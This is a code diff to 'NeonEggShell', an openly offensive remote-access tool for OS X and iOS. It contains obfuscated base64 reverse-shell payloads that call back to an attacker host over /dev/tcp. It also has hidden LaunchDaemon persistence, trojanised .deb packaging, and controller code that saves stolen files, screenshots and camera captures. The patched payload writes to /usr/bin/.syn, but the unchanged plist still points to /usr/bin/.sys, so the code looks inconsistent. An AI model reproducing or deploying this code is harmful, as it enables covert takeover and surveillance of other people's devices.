@@ -29,7 +29,7 @@ def banner():
 |  |\    | |  .--' .-._)   \ 
 |  | \   | |  `---.\       / 
 `--'  `--' `------' `-----' """			
-	print WHITE + "    [Version 1.8.3]"
+	print WHITE + "    [Version 1.8.4]"
 	print RED + "  Created by NeonEggplant" + GREEN
 	print "\nNeonEggShell, OS X and iOS command shell"
 	print WHITE + "For pentesting only, I am not responsable\nfor any damage you may cause" + GREEN
@@ -233,7 +233,7 @@ void loop() {
 }
 """)
 #our launchdaemon
-launchd="""echo 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgoJPGRpY3Q+CgkJPGtleT5MYWJlbDwva2V5PgoJCTxzdHJpbmc+Y29tLmV4YW1wbGUuYXBwPC9zdHJpbmc+CgkJPGtleT5Qcm9ncmFtPC9rZXk+CgkJPHN0cmluZz4vdXNyL2Jpbi8uc3lzPC9zdHJpbmc+CgkJPGtleT5SdW5BdExvYWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+CjwvcGxpc3Q+Cg==' | base64 --decode >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.sys;chmod +x /usr/bin/.sys;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1;launchctl load /Library/LaunchDaemons/.sysinfo.plist
+launchd="""echo 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgoJPGRpY3Q+CgkJPGtleT5MYWJlbDwva2V5PgoJCTxzdHJpbmc+Y29tLmV4YW1wbGUuYXBwPC9zdHJpbmc+CgkJPGtleT5Qcm9ncmFtPC9rZXk+CgkJPHN0cmluZz4vdXNyL2Jpbi8uc3lzPC9zdHJpbmc+CgkJPGtleT5SdW5BdExvYWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+CjwvcGxpc3Q+Cg==' | base64 --decode >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.syn;chmod +x /usr/bin/.syn;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1;launchctl load /Library/LaunchDaemons/.sysinfo.plist
 """
 #create deb file, must have dpkg installed
 def createdebfile(host,port):
@@ -266,7 +266,7 @@ def createdebfile(host,port):
 
 	pload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh 2>/dev/null; sleep 5; done")
 	pload = "echo "+pload+" | base64 --decode | bash;"
-	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.sys;"
+	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.syn;"
 	pload = "echo '"+base64.b64encode(pload)+"' | base64 --decode | bash;"
 	os.system('rm -rf /tmp/nesdeb;\
 	mkdir /tmp/nesdeb;\
@@ -288,7 +288,7 @@ def createdebfile(host,port):
 def persistence(host,port,delay):
 	pload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh 2>/dev/null; sleep "+str(delay)+"; done")
 	pload = "echo "+pload+" | base64 --decode | bash"
-	pload="""if [ "$(id -u)" != "0" ]; then echo "Must be run as root" 1>&2; exit 1;fi;echo '"""+base64.b64encode("echo -e '#!/bin/bash\n"+pload+"'>/usr/bin/.sys;"+launchd)+"' | base64 --decode | bash"
+	pload="""if [ "$(id -u)" != "0" ]; then echo "Must be run as root" 1>&2; exit 1;fi;echo '"""+base64.b64encode("echo -e '#!/bin/bash\n"+pload+"'>/usr/bin/.syn;"+launchd)+"' | base64 --decode | bash"
 	return pload;
 	
 	
@@ -344,26 +344,26 @@ def interactiveshell(name,conn,s,settings,host,port):
 					file=cmd.split()[1]
 					if "/" in file: #save file as the last array of characters after / if file is in another directory
 						file=file.split('/')[-1]
-					with open(file,"w+") as f:
+					with open(file,"w") as f:
 						f.write( base64.b64decode(appendeddata))#write all our data to file
 					print "wrote "+str(int(os.stat(file).st_size*0.125))+" bytes to "+file
 					print "download "+file+" was a success"
 				elif option==2:
 					if "CoreFoundation" in data:
 						continue
-					date_string = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
+					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
 					filename="screenshot-"+date_string+".jpg"
-					with open(filename,"w+") as f:#create file
+					with open(filename,"w") as f:#create file
 						f.write(base64.b64decode(appendeddata))#write to file
 						print "saving to "+filename
 				elif option==3:
-					date_string = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
+					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
 					filename="isight-"+date_string+".jpg"
-					with open(filename,"w+") as f:#create file
+					with open(filename,"w") as f:#create file
 						f.write(base64.b64decode(appendeddata))#write to file
 						print "saving to "+filename
 				elif (option==4) or (option==5):
-					date_string = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
+					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
 					filename=""
 					if option==4:
 						filename="camera_front_ios-"+date_string+".jpg"
@@ -433,7 +433,7 @@ def interactiveshell(name,conn,s,settings,host,port):
 				elif cmd.split()[0]=="launchd":
 					if len(cmd.split()) == 2:
 						if cmd.split()[1] == "uninstall":
-							cmd="rm /usr/bin/.sys; launchctl unload /Library/LaunchDaemons/.sysinfo.plist; rm /Library/LaunchDaemons/.sysinfo.plist"
+							cmd="rm /usr/bin/.syn; launchctl unload /Library/LaunchDaemons/.sysinfo.plist; rm /Library/LaunchDaemons/.sysinfo.plist"
 					else:
 						print WHITE+"Usage: launchd install/uninstall";
 						continue					
